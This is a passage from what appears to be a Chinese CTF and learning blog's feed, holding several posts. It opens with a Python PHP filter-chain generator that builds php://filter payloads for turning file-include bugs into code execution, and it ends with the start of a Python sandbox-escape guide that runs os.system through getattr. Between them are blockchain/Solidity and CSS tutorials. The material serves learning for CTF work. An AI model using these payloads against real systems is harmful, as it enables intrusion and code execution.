    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,
    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,
    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,
    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,
    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,
    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,
    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,
    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,
    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,
    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,
    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,
    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,
    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,
    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,
    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,
    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,
    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,
    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,
    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,
    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,
    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,
    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,
    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,
    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,
    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,
    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span>
&#125;

<span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):

    encoded_chain = chain
    <span class="comment"># generate some garbage base64</span>
    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span>
    filters += <span class="string">&quot;convert.base64-encode|&quot;</span>
    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>


    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:
        filters += conversions[c] + <span class="string">&quot;|&quot;</span>
        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span>
        filters += <span class="string">&quot;convert.base64-decode|&quot;</span>
        filters += <span class="string">&quot;convert.base64-encode|&quot;</span>
        <span class="comment"># get rid of equal signs</span>
        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>
    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:
        <span class="comment"># don&#x27;t add the decode while debugging chains</span>
        filters += <span class="string">&quot;convert.base64-decode&quot;</span>

    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span>
    <span class="keyword">return</span> final_payload

<span class="keyword">def</span> <span class="title function_">main</span>():

    <span class="comment"># Parsing command line arguments</span>
    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)

    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)
    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)
    args = parser.parse_args()
    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:
        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)
        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)
        chain = generate_filter_chain(base64_value)
        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))
        <span class="built_in">print</span>(chain)
    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:
        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)
        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)
        <span class="keyword">if</span> (<span class="keyword">match</span>):
            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)
            <span class="built_in">print</span>(chain)
        <span class="keyword">else</span>:
            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)
            exit(<span class="number">1</span>)

<span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:
    main()
    
链接：https://err0r233.github.io/posts/<span class="number">28510.</span>html</code></pre>



<ul>
<li><p>UTF-8 -&gt;UTF-7</p>
<p>测试代码</p>
</li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="variable">$a</span>=<span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7/resource=Qftm.txt&#x27;</span>;
<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;=&#x27;</span>);

<span class="comment">/**</span>
<span class="comment">Qftm.txt 写入的内容为: +AD0-</span>
<span class="comment">**/</span></code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250328104911141.png" alt="image-20250328104911141"></p>
<p>这里直接给某个师傅博客的截图，这是原链接<a href="https://www.anquanke.com/post/id/202510#h3-15">探索php:&#x2F;&#x2F;filter在实战当中的奇技淫巧-安全KER - 安全资讯平台</a>，懒得打了(瘫)</p>
<h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约深度学习（持续施工ing）</title>
    <url>/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5ing%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<h1 id="智能合约深度学习"><a href="#智能合约深度学习" class="headerlink" title="智能合约深度学习"></a>智能合约深度学习</h1></blockquote>
<h1 id="前序"><a href="#前序" class="headerlink" title="前序"></a>前序</h1><blockquote>
<p><strong>如果想直接入手合约，可以直接跳至合约开发模块哦</strong></p>
</blockquote>
<p>在进入智能合约学习环节之前，让我们先了解一下它的“爹”，即<strong>区块链</strong></p>
<p>区块链，是一种区中心化，点对点系统的工具，也可以说是一种数据库系统（实际上就是一本记录各种交易的账本）</p>
<p>区别于传统的中心化系统，这个系统由各个区块（前区块的加密哈希，时间戳，交易数据）组成，在这个系统中，由网络中的大多数节点来决定新区块中交易记录的录入以及修改。这就使得其安全性远远超过了传统的系统。假设一个用户想要伪造一份交易，那么从理论来说他需要修改全网每个节点的总账，这个过程需要消耗巨量的算力<del>有这算力谁还来伪造交易啊</del>，每增加一个区块，需要全网51%以上的节点的认可才能够组成区块链</p>
<p>那么我们现在更具体一点，来谈一个家喻户晓的区块链系统———比特币系统</p>
<h1 id="关于比特币系统"><a href="#关于比特币系统" class="headerlink" title="关于比特币系统"></a>关于比特币系统</h1><h2 id="竞争记账"><a href="#竞争记账" class="headerlink" title="竞争记账"></a>竞争记账</h2><p>即挖矿，在一个区块建立之后，竞争记账的节点需要计算建立以来所有交易的哈希值（<strong>SHA256</strong>），再将其两两组合，不断重复，最终得到一个SHA256值（也叫<strong>默克根</strong>），最后需要进行以下计算</p>
<pre><code class="highlight plaintext">SHA256(默克根+前一区的ID+一个随机数)</code></pre>

<p>通常这个值要满足哈希值的前20位为0(达成概率在百万分之一水平),也就是算力比拼</p>
<p>成功者向全网发送通知，若经过检验大家就公认他构造的这个区块并以其作为父区块，进行下一个区块的算力竞争（每10分钟进行一次）</p>
<p>成功者会获得12.5个比特币<del>122w美刀(2024.12.9日汇率)</del>作为奖励，这就是中本聪设计的激励机制<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e23cc007503b1060aa2f3f307de43b14.png" alt="img"></p>
<h2 id="长链与短链"><a href="#长链与短链" class="headerlink" title="长链与短链"></a>长链与短链</h2><p>又是算力竞争……在向全网通知时（假设你的答案正确），可能会有人与你在相同的时间发送了正确的答案，于是会出现两条链，那么就又到了拼算力的时候了，不同的矿工会选择不同的链继续下一轮区块计算，这里就不得不提另一种机制了，即<strong>总是选择工作量最大的链</strong>，于是哪条链先出现下一个区块，也就意味着会有更多的矿工选择这条链工作，那么另一条短链就会被废止。组装短链的矿工也得不到比特币奖励，结果就是区块链只有唯一一条主线。</p>
<h2 id="比特币的交易"><a href="#比特币的交易" class="headerlink" title="比特币的交易"></a>比特币的交易</h2><p>交易包括两个方向，Input以及Output.</p>
<p>两者可以不完全一致，但只能输入略大于输出，那么缺少的这部分去哪里了呢 ，是支付给了矿工哦，每笔交易在发布后可以选择支付交易费用，钱到位交易也会更快被打包。但是不代表不支付或支付很少交易费用不会有人处理你的交易，只是会被推迟，总之，不管是否支付交易费用，矿工都会获得比特币的奖励，你可以将其理解为：<strong>即使你不付给服务员小费，但并不影响他获得工资</strong>。</p>
<h2 id="比特币的交易加密"><a href="#比特币的交易加密" class="headerlink" title="比特币的交易加密"></a>比特币的交易加密</h2><p>对于每个用户的钱包，都由三部分组成</p>
<p><strong>16位的地址，公钥，私钥(256位)</strong></p>
<p>假设在A与B交易，A发送给B一条A的私钥加密过的内容，那么若B没有A的公钥，B就无法解密内容</p>
<p>公钥的产生依赖于私钥，而钱包的地址生成依赖于公钥</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/65e01b2554c3850eeeebb60eb7c4b93b.jpeg" alt="img"></p>
<p>贴一条其他师傅的说明过程。</p>
<p>第一步：生成随机私钥</p>
<p>私钥是一个随机数，随机选取一个32字节的数，这个数的范围大小是介于1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141之间的一个数，为了方便后面的计算，我们随机生成一个合法的私钥：</p>
<p>8F72F6B29E6E225A36B68DFE333C7CE5E55D83249D3D2CD6332671FA445C4DD3</p>
<p>第二步：椭圆曲线算公钥</p>
<p>生成了私钥之后，我们使用椭圆曲线加密算法（ECDSA-secp256k1）计算私钥所对应的非压缩公钥，生成的公钥共65字节， 其中一个字节是0x04，其中32个字节是X坐标，另外32个字节是Y坐标：</p>
<p>公钥P.X：<br>06CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385</p>
<p>公钥P.Y：<br>FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
<p>第三步：计算公钥的SHA-256哈希值</p>
<p>将上述公钥地址拼合，得到标准地址：<br>0406CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
<p>对齐进行SHA-256哈希计算，得到结果：<br>2572e5f4a8e77ddf5bb35b9e61c61f66455a4a24bcfd6cb190a8e8ff48fc097d</p>
<p>第四步：计算 RIPEMD-160哈希值</p>
<p>取上一步结果，进行RIPEMD-160计算，得到结果：</p>
<p>0b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第五步：加入地址版本号（比特币主网版本号“0x00”）</p>
<p>取上一步结果，在前面加上16进制的00，即：</p>
<p>000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第六步：计算 SHA-256 哈希值</p>
<p>取上一步结果，进行SHA-256计算，可得：</p>
<p>ddc2270f93cc84cc6869dd373f3c340bbf5cb9a8f5559297cc9e5d947aab2536</p>
<p>然后，对以上结果再次计算 SHA-256 哈希值，得到：</p>
<p>869ac57b83ccf75ca9da8895823562fffb611e3c297d9c2d4612aeeb32850078</p>
<p>第七步：取上一步结果的前4个字节（8位十六进制）</p>
<p>869ac57b</p>
<p>第八步：把这4个字节加在第五步的结果后面</p>
<p>作为校验位，将这4个字节加载第五步的结果后面，这就是比特币地址的16进制形态了：</p>
<p>869ac57b000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
<p>第九步：用Base58编码变换一下地址</p>
<p>对上一步的结果进行Base58编码，得到：</p>
<p>1QCXRuoxWo5Bya9NxHaVBArBQYhatHJrU7</p>
<p>这就是我们经常看到的传统意义上的比特币钱包地址</p>
<h1 id="智能合约开发"><a href="#智能合约开发" class="headerlink" title="智能合约开发"></a>智能合约开发</h1><p>智能合约的开发，主要使用Solidity编译语言以及在线的Remix编译器</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>有符号整数类型包括int8、int16、int32、int64等，而无符号整数类型包括uint8、uint16、uint32、uint64等。这些类型表示不同位数的整数。</p>
<p>相较于C语言，保留了大部分运算，增加了乘方(**)运算以及更改了”&lt;&lt;””&gt;&gt;”的运算规则</p>
<pre><code class="highlight plaintext">x&lt;&lt;y  相当于x*2**y   x&gt;&gt;y相当于x/2**y</code></pre>



<h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>即bool类型，会在内置函数中大量出现，默认值为false</p>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>用<strong>address</strong>来声明，长度为20位，表示以太坊网络上的账户地址</p>
<p>在地址型下有**transfer(转账)<strong>与</strong>balance(账户)**两个变量</p>
<p>通过以下函数来处理地址类型（关于Gas的概念，请见<strong>交易处理</strong>板块）</p>
<pre><code class="highlight plaintext">&lt;address&gt;.balance(uint 256) ——&gt;返回以wei为单位的该地址的以太币账户（1ETH=10^18wei）</code></pre>

<pre><code class="highlight plaintext">&lt;address&gt;.transfer(uint 256 amount) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）</code></pre>

<p>余额不足，Gas不足时会使合约无法执行，回滚已执行的程序并且发送异常信息（<strong>交易被终止</strong>）</p>
<pre><code class="highlight plaintext">&lt;address&gt;.send(uint 256 amount) returns (bool) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）在交易成功或失败后会返回对应的bool值</code></pre>

<p>余额不足，Gas不足时会终止程序但不会发送异常消息，会返回False</p>
<p>但使用.send是存在一定风险的，可能会导致转账失败(调用的堆栈&gt;1024KB或发出方的Gas耗尽)的情况下交易的对方仍能收到以太币</p>
<pre><code class="highlight plaintext">&lt;address&gt;.call(...) returns (bool) ——&gt;最常用的调用函数，失败返回false,Gas的费用可自己调整。</code></pre>

<p>发布低级别的调用</p>
<p>call()下有两个控制交易的内置函数</p>
<p>gas()(支付的Gas值)与value()(支付的以太币值)，两者同时调用没有先后顺序的要求</p>
<pre><code class="highlight plaintext">例如：address.call.gas(100000).value(1 ether)(&quot;register&quot;,&quot;Myname&quot;)</code></pre>



<pre><code class="highlight plaintext">&lt;address&gt;.callcode(...) returns (bool)</code></pre>

<p>发布低级别的调用，没call好用，不久就会被删除了</p>
<pre><code class="highlight plaintext">&lt;address&gt; .delegatecall(...) returns (bool)</code></pre>

<p>发布低级别的代表调用,调用的是储存在另一个库中的库代码(Library code)</p>
<p>？故使用前要确定两个合约的储存设计都要适用于该函数？</p>
<blockquote>
<p>[!WARNING]</p>
<p><code>call()</code> <code>callcode()</code> <code>delegatecall()</code>都是低阶函数，使用时调用的未知合约可能是恶意合约，在调用是可能会被篡权，反过来被调用合约，因此调用函数返回时要注意原合约的参数是否已经被改变</p>
</blockquote>
<blockquote>
<p>地址常量</p>
</blockquote>
<p>​	</p>
<h3 id="字节数组"><a href="#字节数组" class="headerlink" title="字节数组"></a>字节数组</h3><p>分为<strong>固定长度的字节数组</strong>以及<strong>可变长度的字节数组</strong></p>
<p>固定长度的数组可以用bytes1~bytes32来说明(bytes1也可以直接记作byte)</p>
<p>可以通过索引访问以及[变量名].length返回字节长度</p>
<p>可变长度的数组：</p>
<p>①bytes(与array性质相同)</p>
<p>②string(可以理解为特殊的数组)，不可以调用.length&#x2F;索引来访问</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>智能合约</tag>
      </tags>
  </entry>
  <entry>
    <title>深度学习网页前端之CSS</title>
    <url>/2025/03/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%BD%91%E9%A1%B5%E5%89%8D%E7%AB%AF%E4%B9%8BCSS/</url>
    <content><![CDATA[<h1 id="深度学习网页前端之CSS"><a href="#深度学习网页前端之CSS" class="headerlink" title="深度学习网页前端之CSS"></a>深度学习网页前端之CSS</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>你如果问我CSS是什么<del>CSS就是CSS啊</del></p>
<p>那我可以说，平时浏览网页的主要内容就算由CSS构成的，如果说HTML是骨架，那么CSS就是主要的血肉</p>
<p>看看菜鸟教程上是怎么解释的:<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160026108.png" alt="image-20250329160026108"></p>
<h2 id="CSS基础语法"><a href="#CSS基础语法" class="headerlink" title="CSS基础语法"></a>CSS基础语法</h2><p>CSS由两个主要的部分构成:</p>
<ul>
<li>选择器 &#x2F;&#x2F;需要改变样式的HTML元素</li>
<li>一条或多条说明 &#x2F;&#x2F;每给说明&#x3D;1个属性+1个值</li>
</ul>
<p>每个属性有一个值。属性和值被冒号分开</p>
<p>一般都放在head部分的style里</p>
<p>大概长这个样子</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250329160327242.png" alt="image-20250329160327242"></p>
<p>css的注释使用经典的&#x2F;* *&#x2F;</p>
<h2 id="对于多模块的处理"><a href="#对于多模块的处理" class="headerlink" title="对于多模块的处理"></a>对于多模块的处理</h2><p>用过F12的都知道，一个成熟的网页远远不止一种单调的元素，而是能让你眼花缭乱的，这就是通过选择器来进行不同的渲染的</p>
<h3 id="id-选择器"><a href="#id-选择器" class="headerlink" title="id 选择器"></a>id 选择器</h3><p>在{}前加上<code>#[选择器名字]</code></p>
<p>在下面要使用这些属性+值的部分的开始标签加上<code>id=&quot;[选择器名字]&quot;</code></p>
<p>这样就大功告成了</p>
<blockquote>
<p>[!IMPORTANT]</p>
<p>ID属性不要以数字开头，数字开头的ID在 Mozilla&#x2F;Firefox 浏览器中不起作用</p>
</blockquote>
<h3 id="class选择器"><a href="#class选择器" class="headerlink" title="class选择器"></a>class选择器</h3><p>class选择器用于描述一组元素的样式，使用经典款前后闭合</p>
<p>head部分:.</p>
<pre><code class="highlight css">.<span class="selector-attr">[选择器名字]</span>&#123;
属性与值
&#125;</code></pre>

<p>body部分: </p>
<pre><code class="highlight css">&lt;<span class="selector-tag">div</span> class=&quot;<span class="selector-attr">[选择器名称]</span>&quot;&gt;

&lt;/<span class="selector-tag">div</span>&gt;</code></pre>

<h2 id="CSS的插入"><a href="#CSS的插入" class="headerlink" title="CSS的插入"></a>CSS的插入</h2><p>CSS的插入方式有三种</p>
<ul>
<li>外部样式表</li>
<li>内部样式表</li>
<li>内联样式</li>
</ul>
<h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><p>就和图片差不多，从服务器的目录下引入样式表</p>
<pre><code class="highlight html"><span class="comment">&lt;!-- html内 --&gt;</span>
<span class="tag">&lt;<span class="name">head</span>&gt;</span>
<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span>
<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<pre><code class="highlight css"><span class="comment">/*CSS文件内*/</span>
hr &#123;<span class="attribute">color</span>:sienna;&#125;
<span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;
<span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;/images/back40.gif&quot;</span>);&#125;</code></pre>

<p>浏览器会从css文件中读取样式声明，并根据声明来格式文档</p>
<blockquote>
<p>用作外部表的CSS文件不能包含任何的 html 标签</p>
</blockquote>
<p>不要属性值和单位之间留空格:如 <code>margin-left: 20 px</code>应该写为<code>margin-left: 20px</code></p>
<h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>单个文档需要特殊样式时，就使用内部样式表：</p>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span>
<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span>
<span class="language-css">hr &#123;<span class="attribute">color</span>:sienna;&#125;</span>
<span class="language-css"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>:<span class="number">20px</span>;&#125;</span>
<span class="language-css"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>);&#125;</span>
<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><p>由于要将表现和内容混杂在一起，内联样式会损失掉样式表的许多优势。请慎用这种方法，例如当样式仅需要在一个元素上应用一次时。</p>
<p>要使用内联样式，你需要在相关的标签内使用样式（style）属性。Style 属性可以包含任何 CSS 属性。本例展示如何改变段落的颜色和左外边距：</p>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:sienna;margin-left:20px&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>

<h3 id="样式的继承"><a href="#样式的继承" class="headerlink" title="样式的继承"></a>样式的继承</h3><p>如果某些属性在不同的样式表中被同样的选择器定义，那么属性值将从更具体的样式表中被继承过来。 </p>
<p>例如，外部样式表拥有针对 h3 选择器的三个属性：</p>
<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;  <span class="attribute">color</span>:red;    <span class="attribute">text-align</span><span class="selector-pseudo">:left</span>;    <span class="attribute">font-size</span>:<span class="number">8pt</span>; &#125;</code></pre>

<p>而内部样式表拥有针对 h3 选择器的两个属性：</p>
<pre><code class="highlight css"><span class="selector-tag">h3</span> &#123;    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;    <span class="attribute">font-size</span>:<span class="number">20pt</span>; &#125;</code></pre>

<p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p>
<pre><code class="highlight plaintext">color:red; text-align:right; font-size:20pt;</code></pre>

<p>即颜色属性将被继承于外部样式表，而文字排列（text-alignment）和字体尺寸（font-size）会被内部样式表中的规则取代。</p>
<hr>
<p>样式的优先级为:</p>
<p><strong>（内联样式）Inline style &gt; （内部样式）Internal style sheet &gt;（外部样式）External style sheet &gt; 浏览器默认样式</strong></p>
<blockquote>
<p><strong>注意：</strong>如果外部样式放在内部样式的后面，则外部样式将覆盖内部样式</p>
</blockquote>
<h2 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h2><h3 id="Backgrounds"><a href="#Backgrounds" class="headerlink" title="Backgrounds"></a>Backgrounds</h3><h4 id="background-color"><a href="#background-color" class="headerlink" title="background-color:"></a>background-color:</h4><ul>
<li>页面: body{background-color: }</li>
<li>正文: p{background-color:}</li>
<li>标题: h1{background-color: }</li>
<li>指定模块: div{background-color:}</li>
</ul>
<h4 id="backgound-image"><a href="#backgound-image" class="headerlink" title="backgound-image"></a>backgound-image</h4><p>描述了元素的背景图像</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight plaintext">body&#123;background-image: url(&#x27;paper,gif&#x27;)&#125;</code></pre>

]]></content>
      <tags>
        <tag>-Web前端 -CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>沙箱逃逸</title>
    <url>/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>浅浅记一下无处不在的沙箱逃逸</p>
<p>这个东西还是要搭配例题的嗯嗯</p>
<h1 id="沙箱逃逸从入门到放弃"><a href="#沙箱逃逸从入门到放弃" class="headerlink" title="沙箱逃逸从入门到放弃"></a>沙箱逃逸从入门到放弃</h1><h2 id="Pyjail"><a href="#Pyjail" class="headerlink" title="Pyjail"></a><code>Pyjail</code></h2><p><code>misc</code>手也能学会<del>必须学会</del>的小技巧</p>
<p>先介绍一些不太常规的再介绍常规的吧(密码的现在沙箱哪里还有常规的。。。)</p>
<p>先看一些进行信息收集的函数，信息收集完成后才好确定逃逸方向</p>
<h3 id="神必小帮手"><a href="#神必小帮手" class="headerlink" title="神必小帮手"></a>神必小帮手</h3><h4 id="dir"><a href="#dir" class="headerlink" title="dir()"></a>dir()</h4><pre><code class="highlight plaintext">dir()可以用于查看可用的内置函数</code></pre>

<p>主要是用来找作为利用点的函数</p>
<h4 id="dict"><a href="#dict" class="headerlink" title="__dict__"></a><code>__dict__</code></h4><p>一键查属性</p>
<p><code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检<code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检测</p>
<h4 id="getattr"><a href="#getattr" class="headerlink" title="getattr()"></a><code>getattr()</code></h4><p>看看你的属性呢，可以引入模块来执行命令，有种opcode的即视感(雾)</p>
<pre><code class="highlight plaintext">getattr(__import__(&#x27;os&#x27;),&quot;system&quot;)(&#x27;whoami&#x27;)</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250703102411030.png" alt="image-20250703102411030"></p>
<h4 id="getattribute"><a href="#getattribute" class="headerlink" title="__getattribute__"></a><code>__getattribute__</code></h4><p>对象的内置方法，用于在访问对象的任意对象时自动调用</p>
